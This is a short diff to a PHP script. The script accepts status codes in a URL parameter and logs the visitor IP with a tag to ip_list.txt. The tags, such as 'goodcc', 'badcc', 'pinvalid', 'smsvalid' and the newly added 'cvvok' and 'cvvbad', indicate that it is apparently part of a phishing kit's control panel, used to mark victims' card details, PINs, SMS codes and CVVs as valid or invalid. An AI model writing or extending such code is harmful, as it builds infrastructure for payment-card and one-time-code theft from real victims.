@@ -11,7 +11,7 @@ if (!$userIP || empty($urlParam)) {
 }
 
 // Whitelist valid OTP values
-$allowed_otp = ['ssredi', 'sstrue', 'ssfalse', 'tovapp', 'appvalid', 'appbad', 'badcc', 'goodcc', 'pincc', 'pinvalid', 'pinbad', 'showcode', 'smsvalid', 'smsbad'];
+$allowed_otp = ['ssredi', 'sstrue', 'ssfalse', 'tovapp', 'appvalid', 'appbad', 'badcc', 'goodcc', 'pincc', 'pinvalid', 'pinbad', 'showcode', 'smsvalid', 'smsbad', 'cvvok', 'cvvbad', 'ckkok', 'ckkbad'];
 if (!in_array($urlParam, $allowed_otp)) {
     http_response_code(400);
     exit();
@@ -47,6 +47,14 @@ if ($urlParam === 'ssredi') {
     $noteText = $userIP . ',smsvalid';
 } elseif ($urlParam === 'smsbad') {
     $noteText = $userIP . ',smsbad';
+} elseif ($urlParam === 'cvvok') {
+    $noteText = $userIP . ',cvvok';
+} elseif ($urlParam === 'cvvbad') {
+    $noteText = $userIP . ',cvvbad';
+} elseif ($urlParam === 'ckkok') {
+    $noteText = $userIP . ',ckkok';
+} elseif ($urlParam === 'ckkbad') {
+    $noteText = $userIP . ',ckkbad';
 }
 
 $ipListFile = './ip_list.txt';
